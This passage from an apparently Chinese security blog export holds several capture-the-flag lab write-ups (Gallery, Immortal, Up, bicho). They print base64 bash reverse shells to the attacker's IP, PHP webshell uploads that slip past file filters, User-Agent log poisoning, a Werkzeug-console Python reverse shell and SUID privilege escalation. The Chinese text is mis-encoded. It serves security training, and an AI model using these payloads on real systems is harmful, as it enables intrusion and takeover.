\u0026#39;__/ _` |/ __| |/ / â”‚\râ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚\râ”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚\râ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\rFscan Version: 2.0.0\r[2025-04-26 04:53:51] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 [2025-04-26 04:53:51] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\r[2025-04-26 04:53:51] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\r[2025-04-26 04:53:52] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\r[2025-04-26 04:53:52] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\r[2025-04-26 04:53:52] [SUCCESS] ç«¯å£å¼€æ”¾ 127.0.0.1:3306\r[2025-04-26 04:53:52] [SUCCESS] ç«¯å£å¼€æ”¾ 127.0.0.1:22\r[2025-04-26 04:53:52] [SUCCESS] ç«¯å£å¼€æ”¾ 127.0.0.1:8888\r[2025-04-26 04:53:52] [SUCCESS] ç«¯å£å¼€æ”¾ 127.0.0.1:80\r[2025-04-26 04:53:52] [SUCCESS] æœåŠ¡è¯†åˆ« 127.0.0.1:3306 =\u0026gt; [mysql] ç‰ˆæœ¬:8.0.41-0ubuntu0.24.04.1 äº§å“:MySQL Banner:[[.8.0.41-0ubuntu0.24.04.1.^.K`y.3v\u0026lt;L.= d.@79xl1 caching_sha2_password] [2025-04-26 04:53:52] [SUCCESS] æœåŠ¡è¯†åˆ« 127.0.0.1:22 =\u0026gt; [ssh] ç‰ˆæœ¬:9.6p1 Ubuntu 3ubuntu13.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.9.] [2025-04-26 04:53:57] [SUCCESS] æœåŠ¡è¯†åˆ« 127.0.0.1:8888 =\u0026gt; [http]\r[2025-04-26 04:53:57] [SUCCESS] æœåŠ¡è¯†åˆ« 127.0.0.1:80 =\u0026gt; [http]\r[2025-04-26 04:53:57] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4\r[2025-04-26 04:53:57] [INFO] å¼€å§‹æ¼æ´æ‰«æ å°†8888ç«¯å£è½¬å‘å‡ºæ¥\n[root@kali] /home/kali/Gallery â¯ ssh sam@172.17.0.3 -L 8888:127.0.0.1:8888 æŸ¥çœ‹ç½‘é¡µæºç \nsam@7adf2cce45b2:/var/www/terminal$ cat index.php \u0026lt;?php\rsession_start();\rif ($_SERVER[\u0026#39;SERVER_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39;) {\rdie(\u0026#39;Access Denied\u0026#39;);\r}\r$header = \u0026#34;\r______ _ _ / ____/___ _/ / /__ _______ __\r/ / __/ __ `/ / / _ \\/ ___/ / / /\r/ /_/ / /_/ / / / __/ / / /_/ / \\____/\\__,_/_/_/\\___/_/ \\__, / /____/ Gallery Management System v1.0\r--------------------------------\r[?] Try thinking outside the box\r\u0026#34;;\r$output = isset($_POST[\u0026#39;command\u0026#39;]) ? \u0026#39;\u0026#39; : $header;\r$commands = [\u0026#39;help\u0026#39;, \u0026#39;list_art\u0026#39;, \u0026#39;show_artists\u0026#39;, \u0026#39;check_status\u0026#39;, \u0026#39;view_logs\u0026#39;, \u0026#39;system_info\u0026#39;];\rif (isset($_POST[\u0026#39;command\u0026#39;])) {\r$cmd = $_POST[\u0026#39;command\u0026#39;];\rif ($cmd === \u0026#39;help\u0026#39;) {\r$output = \u0026#34;Available commands:\\n\u0026#34;;\r$output .= \u0026#34;----------------\\n\u0026#34;;\rforeach ($commands as $command) {\r$output .= \u0026#34;- $command\\n\u0026#34;;\r}\r$output .= \u0026#34;\\nGallery Management System - Admin Interface\u0026#34;;\r} else if ($cmd === \u0026#39;list_art\u0026#39;) {\r$output = \u0026#34;Current Artworks:\\n\u0026#34;;\r$output .= \u0026#34;- La noche estrellada (ID: 1)\\n\u0026#34;;\r$output .= \u0026#34;- Mona Lisa (ID: 2)\\n\u0026#34;;\r$output .= \u0026#34;Status: Display Only Mode\u0026#34;;\r} else if ($cmd === \u0026#39;show_artists\u0026#39;) {\r$output = \u0026#34;Registered Artists:\\n\u0026#34;;\r$output .= \u0026#34;- Vincent van Gogh\\n\u0026#34;;\r$output .= \u0026#34;- Leonardo da Vinci\\n\u0026#34;;\r$output .= \u0026#34;Access Level: Read Only\u0026#34;;\r} else if ($cmd === \u0026#39;check_status\u0026#39;) {\r$output = \u0026#34;Gallery System Status:\\n\u0026#34;;\r$output .= \u0026#34;- Database: Connected\\n\u0026#34;;\r$output .= \u0026#34;- Backup: Enabled\\n\u0026#34;;\r$output .= \u0026#34;- Security: Enhanced\\n\u0026#34;;\r$output .= \u0026#34;- Last Check: \u0026#34; . date(\u0026#34;Y-m-d\u0026#34;);\r} else if ($cmd === \u0026#39;view_logs\u0026#39;) {\r$output = \u0026#34;Recent Activity:\\n\u0026#34;;\r$output .= \u0026#34;- [INFO] System startup\\n\u0026#34;;\r$output .= \u0026#34;- [WARN] Failed login attempt\\n\u0026#34;;\r$output .= \u0026#34;- [INFO] New artwork added\\n\u0026#34;;\r$output .= \u0026#34;Access: Restricted\u0026#34;;\r} else if ($cmd === \u0026#39;system_info\u0026#39;) {\r$output = \u0026#34;Gallery Management System\\n\u0026#34;;\r$output .= \u0026#34;Version: 1.0\\n\u0026#34;;\r$output .= \u0026#34;Environment: Production\\n\u0026#34;;\r$output .= \u0026#34;Access Level: Guest\u0026#34;;\r} else if (strpos($cmd, \u0026#39;;\u0026#39;) !== false || strpos($cmd, \u0026#39;|\u0026#39;) !== false) {\r// AquÃ­ es donde realmente ejecutamos comandos\r$output = shell_exec($cmd);\r} else {\r$output = \u0026#34;Command not found. Type \u0026#39;help\u0026#39; for available commands.\u0026#34;;\r}\r$output = $header . \u0026#34;\\n\u0026#34; . $output;\r}\r?\u0026gt; å‘ç°åªéœ€è¦å­˜åœ¨åˆ†å·æˆ–è€…å¼•å·ï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤\nâ¤ docker0 â†’ 172.17.0.1:4444\rprintf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash Summary #\rUserï¼šsqlæ³¨å…¥æ‹¿åˆ°ç”¨æˆ·ç™»å½•å¯†ç \nRootï¼šåˆ†ææºç ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\næˆ‘è§‰å¾—è¿™ä¸ªæœºå™¨åº”è¯¥ç®—easyéš¾åº¦\n","date":"2025-04-26","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-gallery/","section":"Posts","summary":"","title":"Dockerlabs-Gallery","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/immportal â¯ nmap 192.168.55.17 -sV -A -p- PORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:192.168.55.4\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 3\r| vsFTPd 3.0.3 - secure, fast, stable\r|_End of status\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r|_-rw-r--r-- 1 0 0 504 Feb 27 2024 message.txt\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\r| ssh-hostkey: | 3072 e8:79:ad:8b:d1:a8:39:1b:ac:ed:52:ef:d0:22:0e:eb (RSA)\r| 256 65:df:6d:1d:49:11:bd:f3:2f:fa:10:0c:3b:48:69:39 (ECDSA)\r|_ 256 f6:b7:bf:cf:a5:d5:1b:26:4e:13:08:31:07:d5:79:b1 (ED25519)\r80/tcp open http Apache httpd 2.4.56 ((Debian))\r|_http-title: Password\r|_http-server-header: Apache/2.4.56 (Debian) Own www-data #\rå‘ç°å¯†ç æ˜¯ï¼šsantiago\nè¿›å…¥åå¾—åˆ°ä¸€ä¸ªæ–°çš„php\nMessage to all.\rI\u0026#39;m glad you made it, I knew you would guess the password, it\u0026#39;s the one we always used, although Boyras recommended us to stop using it because \u0026#34;it was in rockyou\u0026#34;. By the way guys, you can still upload messages to the server from this new path -\u0026gt; upload_an_incredible_message.php\rSaying goodbye very happy, David è¿›å…¥åå¯ä»¥ä¸Šä¼ æ–‡ä»¶åˆ°**/chat**ç›®å½•\nå¹¶ä¸”å‘ç°phtmlå¯ä»¥ç»•è¿‡é»‘åå•\nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;321.phtml\u0026#34;\rContent-Type: text/plain\rGIF89a\r\u0026lt;?php system(\u0026#34;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41NS40LzQ0NDQgMD4mMSkgJg==|base64 -d|bash\u0026#34;);?\u0026gt; è¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–åˆ°user.txt\nOwn drake #\rå‘ç°äº†ä¸€ä¸ªå¯†ç æ–‡ä»¶\nwww-data@Immortal:/home/drake/...$ ls -al\rtotal 12\rdrwxr-xr-x 2 drake drake 4096 Feb 27 2024 .\rdrwxr-xr-x 4 drake drake 4096 Feb 29 2024 ..\r-rw-r--r-- 1 drake drake 134 Feb 27 2024 pass.txt\rwww-data@Immortal:/home/drake/...$ cat pass.txt netflix : drake123\ramazon : 123drake\rshelldred : shell123dred (f4ns0nly)\rsystem : kevcjnsgii\rbank : myfavouritebank\rnintendo : 123456 å…¶ä¸­systemçš„å¯†ç å°±æ˜¯drakeçš„å¯†ç \nOwn eric #\rdrake@Immortal:~/...$ sudo -l\rMatching Defaults entries for drake on Immortal:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser drake may run the following commands on Immortal:\r(eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py æŸ¥çœ‹å…·ä½“å†…å®¹\ndrake@Immortal:~/...$ ls -al /opt/\rtotal 16\rdrwxr-xr-x 2 root root 4096 Feb 28 2024 .\rdrwxr-xr-x 18 root root 4096 Feb 27 2024 ..\r-rw-rw-rw- 1 root root 147 Feb 28 2024 immortal.py\r-rw-r--r-- 1 root root 36 Feb 28 2024 immortal.txt\rdrake@Immortal:~/...$ cat /opt/immortal.py a = input(str(\u0026#34;Do you want to be immortal: \u0026#34;))\rif a.lower() == \u0026#34;yes\u0026#34; or a.lower() == \u0026#34;no\u0026#34;:\rprint(\u0026#34;Bad answer\u0026#34;)\relse:\rprint(\u0026#34;Are you sure?\u0026#34;) å‘ç°å¯ä»¥ä¿®æ”¹æ–‡ä»¶å†…å®¹\ndrake@Immortal:/opt$ cat immortal.py import os\ros.system(\u0026#34;bash -p\u0026#34;) Root #\reric@Immortal:~$ sudo -l\rMatching Defaults entries for eric on Immortal:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser eric may run the following commands on Immortal:\r(root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\r(root) NOPASSWD: /usr/bin/systemctl start immortal.service\r(root) NOPASSWD: /usr/bin/systemctl stop immortal.service\r(root) NOPASSWD: /usr/bin/systemctl enable immortal.service\r(root) NOPASSWD: /usr/bin/systemctl disable immortal.service\r(root) NOPASSWD: /usr/bin/systemctl daemon-reload å¯ä»¥å…ˆç”¨sudoeditä¿®æ”¹å†…å®¹ä¸º\n[Unit]\rDescription=Immortal Service\rAfter=network.target\r[Service]\rType=oneshot\rExecStart=chmod u+s /bin/bash\r[Install]\rWantedBy=multi-user.target Summary #\ræ¯”è¾ƒç®€å•ï¼Œä¸å¤šè¯´äº†\n","date":"2025-04-26","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-immortal/","section":"Posts","summary":"","title":"HackMyVM-Immortal","type":"posts"},{"content":"\rBox Info #\rOS Linux Diffculty Easy Nmap #\r[root@kali] /home/kali/up â¯ nmap 192.168.55.16 -sV -A -p-\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: RodGar - Subir Imagen è¿›å…¥ä¹‹åæ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼Œç»è¿‡æµ‹è¯•æ²¡æœ‰æ¼æ´\nFeroxbuster #\r[root@kali] /home/kali/up â¯ feroxbuster -u \u0026#39;http://192.168.55.16/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.16/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php, txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 150l 388w 4489c http://192.168.55.16/\r301 GET 9l 28w 316c http://192.168.55.16/uploads =\u0026gt; http://192.168.55.16/uploads/\r301 GET 9l 28w 319c http://192.168.55.16/javascript =\u0026gt; http://192.168.55.16/javascript/\r200 GET 150l 388w 4489c http://192.168.55.16/index.php\r403 GET 31l 94w 964c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 1l 1w 1301c http://192.168.55.16/uploads/robots.txt\r301 GET 9l 28w 329c http://192.168.55.16/javascript/clipboard =\u0026gt; http://192.168.55.16/javascript/clipboard/\r200 GET 858l 3081w 26377c http://192.168.55.16/javascript/clipboard/clipboard Own www-data #\ræ³¨æ„åˆ°**/uploadsä¸‹è¿˜æœ‰ä¸€ä¸ªrobots.txt**ï¼Œç»è¿‡è§£ç å¾—åˆ°æºç \nåˆ†æå¯ä»¥çœ‹å‡ºï¼Œæ–‡ä»¶åæ˜¯ç»è¿‡Rot13ä½ç§»åçš„\n\u0026lt;?php\rif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) {\r$targetDir = \u0026#34;uploads/\u0026#34;;\r$fileName = basename($_FILES[\u0026#34;image\u0026#34;][\u0026#34;name\u0026#34;]);\r$fileType = pathinfo($fileName, PATHINFO_EXTENSION);\r$fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);\r$allowedTypes = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;gif\u0026#39;];\rif (in_array(strtolower($fileType), $allowedTypes)) {\r$encryptedFileName = strtr($fileBaseName, \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#39;, \u0026#39;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm\u0026#39;);\r$newFileName = $encryptedFileName . \u0026#34;.\u0026#34; . $fileType;\r$targetFilePath = $targetDir . $newFileName;\rif (move_uploaded_file($_FILES[\u0026#34;image\u0026#34;][\u0026#34;tmp_name\u0026#34;], $targetFilePath)) {\r$message = \u0026#34;El archivo se ha subido correctamente.\u0026#34;;\r} else {\r$message = \u0026#34;Hubo un error al subir el archivo.\u0026#34;;\r}\r} else {\r$message = \u0026#34;Solo se permiten archivos JPG y GIF.\u0026#34;;\r}\r}\r?\u0026gt; ç”±äºæ˜¯ç™½åå•ï¼Œå› æ­¤åªèƒ½çŒœæµ‹é…ç½®é”™è¯¯å¯¼è‡´æŸä¸ªåç¼€åè¢«è§£æä¸ºPHP\nPOST / HTTP/1.1\rHost: 192.168.55.16\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: multipart/form-data; boundary=----geckoformboundaryb6ec38d14456abf0196cf2873090c48a\rContent-Length: 240\rOrigin: http://192.168.55.16\rConnection: close\rReferer: http://192.168.55.16/\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r------geckoformboundaryb6ec38d14456abf0196cf2873090c48a\rContent-Disposition: form-data; name=\u0026#34;image\u0026#34;; filename=\u0026#34;tomcat.gif\u0026#34;\rContent-Type: image/gif\rGIF89a\r\u0026lt;?php phpinfo();?\u0026gt;\r------geckoformboundaryb6ec38d14456abf0196cf2873090c48a-- \u0026lt;?php system(\u0026#34;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41NS40LzQ0NDQgMD4mMSkgJg==|base64 -d|bash\u0026#34;);?\u0026gt; Own rodgar #\ræŸ¥çœ‹sudo\nwww-data@debian:/var/www/html/uploads$ sudo -l\rMatching Defaults entries for www-data on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser www-data may run the following commands on debian:\r(ALL) NOPASSWD: /usr/bin/gobuster åœ¨kaliä¸Šå¼€å¯httpæœåŠ¡\n[root@kali] / â¯ python -m http.server 80\rwww-data@debian:/tmp$ sudo /usr/bin/gobuster dir -u http://192.168.55.4/ -w /root/rodgarpass å¾—åˆ°å¯†ç å“ˆå¸Œï¼Œå¥½åƒåªæœ‰31ä½ï¼Ÿ\nb45cffe084dd3d20d928bee85e7b0f2 å› æ­¤éœ€è¦å°è¯•çˆ†ç ´ä¸€ä¸‹ï¼Œè¿™é‡Œä¹Ÿä¸å¤šè¯´äº†ï¼Œåé¢æ·»åŠ ä¸€ä¸ª1ï¼Œè¡¥å…¨32ä½å°±å¥½äº†\nç„¶åå¯†ç å±…ç„¶æ˜¯å“ˆå¸Œå€¼ï¼Œè€Œä¸æ˜¯æ˜æ–‡ï¼Œç¦»è°±\nRoot #\rrodgar@debian:/home$ sudo -l\rMatching Defaults entries for rodgar on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser rodgar may run the following commands on debian:\r(ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make make | GTFOBins Summary #\ræ²¡å•¥å¥½è¯´çš„ã€‚\n","date":"2025-04-26","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-up/","section":"Posts","summary":"","title":"HackMyVM-Up","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/bicho â¯ nmap 172.17.0.2 -sV -A -p- Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 09:26 EDT\rNmap scan report for 172.17.0.2\rHost is up (0.000089s latency).\rNot shown: 65534 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-title: Did not follow redirect to http://bicho.dl\r|_http-server-header: Apache/2.4.58 (Ubuntu) æ·»åŠ bicho.dlåˆ°**/etc/hosts**\nå‘ç°æ˜¯wordpressæ­å»ºçš„ç½‘ç«™\n[root@kali] /home/kali/bicho â¯ whatweb http://bicho.dl http://bicho.dl [200 OK] Apache[2.4.58], Bootstrap[0.8,6.6.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.6.2], Script[text/javascript], Title[Visit Suazilandia ğŸ‡¸ğŸ‡¿], UncommonHeaders[link], WordPress[6.6.2] WPscan #\r[root@kali] /home/kali/bicho â¯ wpscan --url http://bicho.dl/ â\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â®\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion 3.8.28\r@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\r_______________________________________________________________\r[i] Updating the Database ...\r[i] Update completed.\r[+] URL: http://bicho.dl/ [172.17.0.2]\r[+] Started: Thu Apr 24 09:30:43 2025\rInteresting Finding(s):\r[+] Headers\r| Interesting Entry: Server: Apache/2.4.58 (Ubuntu)\r| Found By: Headers (Passive Detection)\r| Confidence: 100%\r[+] XML-RPC seems to be enabled: http://bicho.dl/xmlrpc.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| References:\r| - http://codex.wordpress.org/XML-RPC_Pingback_API\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\r| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\r[+] WordPress readme found: http://bicho.dl/readme.html\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] Debug Log found: http://bicho.dl/wp-content/debug.log\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| Reference: https://codex.wordpress.org/Debugging_in_WordPress\r[+] Upload directory has listing enabled: http://bicho.dl/wp-content/uploads/\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] The external WP-Cron seems to be enabled: http://bicho.dl/wp-cron.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 60%\r| References:\r| - https://www.iplocation.net/defend-wordpress-from-ddos\r| - https://github.com/wpscanteam/wpscan/issues/1299\r[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).\r| Found By: Rss Generator (Passive Detection)\r| - http://bicho.dl/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.6.2\u0026lt;/generator\u0026gt;\r| - http://bicho.dl/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.6.2\u0026lt;/generator\u0026gt;\r[+] WordPress theme in use: bosa-travel-agency\r| Location: http://bicho.dl/wp-content/themes/bosa-travel-agency/\r| Latest Version: 1.0.0 (up to date)\r| Last Updated: 2025-03-27T00:00:00.000Z\r| Readme: http://bicho.dl/wp-content/themes/bosa-travel-agency/readme.txt\r| Style URL: http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2\r| Style Name: Bosa Travel Agency\r| Style URI: https://bosathemes.com/bosa-travel-agency\r| Description: Bosa Travel Agency is multipurpose business theme. Bosa Travel Agency is beautiful, fast, lightweigh...\r| Author: Bosa Themes\r| Author URI: https://bosathemes.com\r|\r| Found By: Css Style In Homepage (Passive Detection)\r|\r| Version: 1.0.0 (80% confidence)\r| Found By: Style (Passive Detection)\r| - http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2, Match: \u0026#39;Version: 1.0.0\u0026#39;\r[+] Enumerating All Plugins (via Passive Methods)\r[i] No plugins Found.\r[+] Enumerating Config Backups (via Passive and Aggressive Methods)\rChecking Config Backups - Time: 00:00:00 \u0026lt;=================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:00\r[i] No Config Backups Found.\r[!] No WPScan API Token given, as a result vulnerability data has not been output.\r[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\r[+] Finished: Thu Apr 24 09:30:46 2025\r[+] Requests Done: 187\r[+] Cached Requests: 5\r[+] Data Sent: 44.268 KB\r[+] Data Received: 22.635 MB\r[+] Memory used: 265.609 MB\r[+] Elapsed time: 00:00:03 Own www-data #\rå‘ç°ä¸€ä¸ªdebug.logï¼Œé‡Œé¢ä¼šå­˜æ”¾ç™»å½•å¤±è´¥çš„ä¿¡æ¯\nå°è¯•ä¿®æ”¹User-Agentçš„å†…å®¹ä¸ºphpä»£ç \nPOST /wp-login.php HTTP/1.1\rHost: bicho.dl\rContent-Length: 95\rCache-Control: max-age=0\rAccept-Language: en-US,en;q=0.9\rOrigin: http://bicho.dl\rContent-Type: application/x-www-form-urlencoded\rUpgrade-Insecure-Requests: 1\rUser-Agent: \u0026lt;?php phpinfo();?\u0026gt;\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\rReferer: http://bicho.dl/wp-login.php\rAccept-Encoding: gzip, deflate, br\rCookie: wordpress_test_cookie=WP%20Cookie%20check\rConnection: keep-alive\rlog=bicho\u0026amp;pwd=123\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbicho.dl%2Fwp-admin%2F\u0026amp;testcookie=1 æˆåŠŸæ‰§è¡Œä»£ç \nè¿™é‡Œéœ€è¦æ³¨æ„ä¸‹ï¼Œä¼¼ä¹åªèƒ½ä½¿ç”¨åå¼•å·æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå…¶ä»–çš„ä¼šå¯¼è‡´æ•´ä¸ªlogå´©æºƒï¼Œä»è€Œéœ€è¦é‡å¯docker\nåœ¨User-Agentæ’å…¥ä»¥ä¸‹ä»£ç \n\u0026lt;?php echo `printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash`;?\u0026gt; Own app #\ræŸ¥çœ‹åˆ°å†…ç½‘ç«¯å£5000å¼€æ”¾\nä¸Šä¼ socatå°†å…¶è½¬æ¢å‡ºæ¥\nwww-data@3b66fe911993:/tmp$ ./socat TCP-LISTEN:8080,fork TCP:127.0.0.1:5000 \u0026amp;\r[1] 2743 æŸ¥çœ‹æœåŠ¡ä¿¡æ¯\n[root@kali] /home/kali/bicho â¯ whatweb http://bicho.dl:8080\rhttp://bicho.dl:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.3], IP[172.17.0.2], Python[3.12.3], Title[Blog de Writeups], Werkzeug[3.1.3] å°è¯•è®¿é—®**/consoleè·¯ç”±ï¼Œå‘ç°è¿”å›ç æ˜¯400**ï¼Œæœç´¢åå¾—åˆ°ä¸€ä¸ªæ–‡ç« ğŸ‘‡\nflaskæ— æ³•è®¿é—®consoleçš„é—®é¢˜è§£å†³ 2024 | the0n3 åªéœ€è¦ä½¿ç”¨hackbarï¼Œè®¾ç½®Hostä¸º127.0.0.1å³å¯ç»•è¿‡ï¼Œå¹¸è¿çš„æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦è¾“å…¥pinç å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤\nå› æ­¤å¯ä»¥ç”Ÿæˆä¸€ä¸ªpythonçš„åå¼¹shellï¼šHYHçš„åå¼¹Shellç”Ÿæˆå™¨\nhttp://172.17.0.2:8080/console?__debugger__=yes\u0026amp;cmd=import os,pty,socket;s=socket.socket();s.connect((\u0026#34;172.17.0.1\u0026#34;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026amp;frm=0\u0026amp;s=8mGrwebyWWtc1TQPNb2E Own wpuser #\ræŸ¥çœ‹sudoä¿¡æ¯\napp@3b66fe911993:/home$ sudo -l\rsudo -l\rMatching Defaults entries for app on 3b66fe911993:\renv_reset, 